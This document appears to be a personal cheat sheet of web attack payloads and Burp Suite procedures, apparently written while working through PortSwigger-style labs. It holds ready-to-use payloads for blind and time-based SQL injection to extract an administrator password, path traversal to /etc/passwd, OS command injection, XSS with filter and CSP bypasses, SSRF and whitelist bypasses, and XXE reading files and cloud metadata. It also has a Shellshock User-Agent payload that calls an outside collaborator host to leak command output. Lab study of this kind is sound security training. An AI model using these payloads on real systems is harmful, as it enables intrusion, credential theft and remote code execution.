- you can change the value of the password length and also change the '>' to '='
[+] {' anD (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='$a$'--}paste this in the intuder after the TRACKING ID   
- change payload type to BRUTE FORCER and min:1 max:1 then start attack
- check for one with a different value than the others in the result
- change the payload password number to 2...e.t.c  --payload to bruteforce password 
[+] ' anD (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator')='$a$'--}

- if web app responds, try to select from users table {'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--}
- to check if the above "users" table exists try ask for a false table e.g ("usersssss"), you'll find out by response time 
- {'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--}
- use the above injection to check if there's an admin in the table and also test for the false e.g ("administratorgdgdg")
- {'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--}
- use the above injection to check for password length, keep changing password length (>"number_here")
- change the ">" to "=" in the above injection 
- '||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
- to guess passsword character, you can change position and letter if youe doing it manually 
- on automation use INTRUDER and then add sign to the first "1" and the "a"
- use CLUSTER BOMB attack and payload as NUMBERS, FROM:1 TO:20 STEPS:1
- use BRUTE FORCER for next pane, because it's a time based SQL got to REQUEST POOL and change request max to 1
- start attck, go to columns in RESULT and enable RESPONSE RECIEVED 
- check for response time over 1000 --testing for blind SQL injection using time based SQLi in tracking ID field

[+] use "../etc/passwd" as much as possible till file loads if vuln
[+] if "../etc" is being filtered try a null byte "../../../etc/passwd%00.jpg"
[+] if "../" is stripped try doubling your forward characters by "....//....//....//etc/passwd"
[+] for file path traversal try going back to root dir and gaing passwd by entering "../../../etc/passwd" infront of "/var/www/whatever"

#OS INJECTION
[+] ";uname"/";pwd" right inline/front of a parameter or endpoint 
[+] Check Submit Feedback and test email with ";sleep+5;"
- or use "||sleep+5||"

#XSS
[+] <Img Src=OnXSS OnError=confirm(1)> -- WAF Bypass payload 
[+] Test site with html injection tags e.g <b>test<b> beforre inputting XSS
[+] Scope: test COMMENTS, FEEDBACKS, CHECK STOCK & SEARCH 
[+] Check the string or parameter you are entrapped by inspecting webpage
[+] Use "=javascript:alert(1)" within URL if trapped in HREF argument or URL PATH
- if trapped in an src tag, close the src tag and inject XSS e.g {"><script>alert(6)</script>}
- or {"onload=alert(2)} into search bar
[+] Use {';alert(5);//} in comment/serach section  --break out of a JS code
[+] Manipulate store ID and check where you got trapped

[+] Use Wappalyzer to cehck site Library
[+] Bypaas back tick "${alert(2)}"
[+] Escape backward slash with {\';alert(5);//}
[+] Escape href tag parameter ');, add {alert(8);//');} behind website url in WEBSITE adding field
- if the WA adds a backward slash to counter, add a backward slash to the url e.g "https://google.com\');alert(8);//"
- if program filter single quote change to encoding e.g "https://google.com&apos;);alert(8);//" --stored XSS into oneclick event 
[+] if all HTML tags are blocked use a non-working tag to test the search then input "<bkk onfocus=alert(8) tabindex=1>blog<\bkk>" to treat the tag as an element
- if attribute is not allowed, forward the test search to intruder, clear the word tested in the POSITION and add "<$$>"
- copy and paste all possible html tag into PAYLOAD section and start attack
- use/test the tag with a 200 ok
- add the working tag to the POSITION with url encoding of SPACE e.g "serach=<body%20$$>", paste possible JS events into PAYLOADS and start atatck
- use JS event that work with accepted HTML tag
[+] Intercept XSS request and FORWARD it till you get a POST request 
- add "&token=sss" in URL to see where it is being injected in site 
- mark option to intercept response in proxy 
- add {;script-src-elem 'unsafe-inline'} to URL containing XSS and paste in browser --CSP token


#SSRF 
[+] INTERCEPT the check stock option, check for the STOCK API(mostly URL encoded so highlight it and right click convert/URL/decode)
- test the functionality of the stockAPI request section by changing it to "=http://localhost/" then URL encode this because the WA initiatlly did this 
- foward request till page loads within itself 
- copy ADMIN page URL loaded within the site and INTERCEPT "checkstock" again
- paste/check the destination of admin panel and paste in stockAPI "http://localhost/admin"
- interecept checkstock again and copy URL to delete/whatever action to perform and paste in stockAPI ENCODE & DECODE
- Do not remove interception till youre done on admin page because of WAF  -- SSRF with lacal server
[+] Test "check stock" option 
- decode the URL and check where the IP hosting the web server, test the IP by changing its value 
- send request to intruder, clear $ signs, add $last_no_in_IP$ 
- PAYLOAD TYPE:number, FROM:1, TO: 254, STEP: 1, start attack 
- note the page that throws a "404" 
- send the 404 request to repeater and test with a web dir e.g (/admin)
- copy url to delete or access files, paste in stockAPI, encode and send request --Basic SSRF against another back-end system
[+] you can Capitalize few letters in the "//localhost/" or refer to the IP of the local "127.0.0.1" 
- you can also double "url encode all characters" in the <"localhost">
- you can capitalize a part of the directory you want to gain access into e.g </aDmin>  --SSRF with blacklist-based filter
[+] load stockAPI against localhost and check if the error message directs you to any external site
- send request to that site with an "@" symbol infront e.g <http://@stock.com/>
- if still whitelisted, access local host with authority symbol and url e.g <http://localhost?@stock.com>
- do not forget to double url encode "?" 
- enter the web dir you want by pasting url into stockapi  --Bypass whitelist 
[+] check stock and see if there is an option for NEXT PRODUCT
- separetely load up the next product and try to see if it allows open redirect, test with <&path=https:google.com>
- copy the url and path of the next product and paste in the checkstock own
- replace the stockAPI url to that of product on a next page then add <&path=http://localhost/>
- if an error message occur then try removing the domain and current page ID, leaving only the product dir and redirect path OR
- URL encode key characters -- SSRF with filter bypass via open redirection vulnerability

#BLIND SSRF 
[+] Test the view product section by intercepting to see if there is "Referer server address"
- copy and paste referer address to BURP COLLABORATOR and poll request
- copy collaborator payload and replace in the referer address
- forward request and poll request to see requests sent  
- check for "user agent  serever exploit(shellshock)" on google  
- intercept view product request, send to repeater
- change referer address to <http://192.168.0.1:8080/> and change User-Agent to shellshock exploit <() {:;}; /usr/bin/nslookup $ (.whoami) mycollaboratorserver.com>  
- send request and pull collaborator request
- if not vulnerable, send view product details request with the shellshock payload to intruder, clear $ signs and add sign to the last number on the server IP to check which one is vulnerable
- check collaborator once attack is complete and look for sent DNS request in Poll 
- if vulnerable, change the <whoami> to <uname>  and you can chain this vulnerability already to an RCE -- Blind SSRF with Shellshock exploitation
// this method is for PRO version of Burp suite
// if you close collaborator while testing you'll need to generate a new domian 

#XXE 
[+] intercept check stock, check content typr for XML
- paste payload {<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>} under XML 
- change number under product ID to <xxe;> and send request to read data stored in the XXE variable
[+] {<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>} change file path to IP address of server ypu want to commuicate with 
- clear the product ID, add <xxe;>
- if the error message prompts you to a dir, add the dir to your payload path e.g {<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/new_path"> ]>}
// if faced with a case of no tangible error messages pointing to directories, try and run your own server and place your server IP in the payload path to replace the web's server IP
